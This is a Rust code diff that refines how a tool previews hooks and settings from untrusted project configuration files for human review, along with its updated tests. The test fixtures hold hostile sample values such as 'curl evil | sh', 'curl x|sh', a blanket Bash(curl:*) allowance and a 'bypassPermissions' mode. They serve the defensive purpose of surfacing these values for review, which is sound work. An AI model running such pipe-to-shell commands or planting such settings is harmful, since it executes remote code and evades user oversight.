@@ -174,6 +174,11 @@ fn settings_preview(bytes: &[u8]) -> Vec<(String, String)> {
                         continue;
                     };
                     for matcher in list {
+                        // Which tools it fires for belongs to the review.
+                        let label = match matcher.get("matcher").and_then(Value::as_str) {
+                            Some(m) => format!("{label}[{m}]"),
+                            None => label.clone(),
+                        };
                         match matcher.get("hooks").and_then(Value::as_array) {
                             Some(hooks) => out.extend(hooks.iter().map(|hook| (label.clone(), hook.get("command").map_or_else(|| hook.to_string(), text)))),
                             None => out.push((label.clone(), matcher.to_string())),
@@ -674,10 +679,13 @@ mod tests {
         .unwrap();
         let preview = claude_settings_preview(&project);
         let has = |what: &str, value: &str| preview.iter().any(|(w, v)| w == what && v == value);
-        assert!(has("hook PreToolUse", "touch x") && has("apiKeyHelper", "curl evil | sh") && has("env", "A=1"));
+        assert!(has("hook PreToolUse[*]", "touch x") && has("apiKeyHelper", "curl evil | sh") && has("env", "A=1"));
         assert!(has("permissions.allow", r#"["Bash(curl:*)"]"#) && has("permissions.defaultMode", r#""bypassPermissions""#), "{preview:?}");
         assert!(preview.iter().any(|(w, v)| w == "fileSuggestion" && v.contains("curl x|sh")), "{preview:?}");
-        assert!(settings_preview(br#"{"hooks":{"Stop":{"command":"odd"},"Pre":[{"command":"direct"}]}}"#).iter().all(|(w, v)| w.starts_with("hook ") && (v.contains("odd") || v.contains("direct"))));
+        let odd = settings_preview(br#"{"hooks":{"Stop":{"command":"odd"},"Pre":[{"command":"direct"}]}}"#);
+        assert_eq!(odd.len(), 2, "{odd:?}");
+        assert!(odd.iter().all(|(w, v)| w.starts_with("hook ") && (v.contains("odd") || v.contains("direct"))));
+        assert!(has("hook PreToolUse[*]", "touch x"), "{preview:?}");
         // Never trusted: nothing is loaded, and the contents are there to read with /hooks.
         let never = Hooks::load(&Places { project: project.clone(), user: Some(user.clone()) });
         assert_eq!(never.untrusted_settings().len(), preview.len());
